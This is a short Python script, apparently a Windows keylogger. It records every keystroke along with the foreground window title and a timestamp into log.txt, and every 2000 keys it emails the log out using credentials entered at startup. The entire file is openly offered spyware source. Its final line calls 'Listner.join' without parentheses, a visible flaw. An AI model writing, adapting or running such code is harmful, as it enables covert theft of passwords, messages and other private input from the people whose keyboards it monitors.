from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
from MailSender import send_txt
import os.path


emailfrom = input('enter your email: ')
emailpass = input('enter your email password: ')
emailto = input('which email do you want to send the log to: ')
keycount = 0


def on_press(key):
    global keycount
    with open('log.txt', 'a+') as log:
        
        keycount += 1
        if keycount > 2000:
            keycount = 0
            send_txt(emailfrom, emailpass, emailto)
            log.truncate(0)

        log.write((
            f"{str(GetWindowText(GetForegroundWindow()).encode('ascii', 'ignore'),'utf-8')[:25]:<25}"
            "  |  "
            f"{datetime.now().strftime('%H:%M:%S')}"
            "  |  "
            f"{key}\n"))


if __name__ == '__main__':

    if not os.path.isfile('log.txt'):
        makelog = open('log.txt', 'w').close()

    with Listener(on_press=on_press) as Listner:
        Listner.join
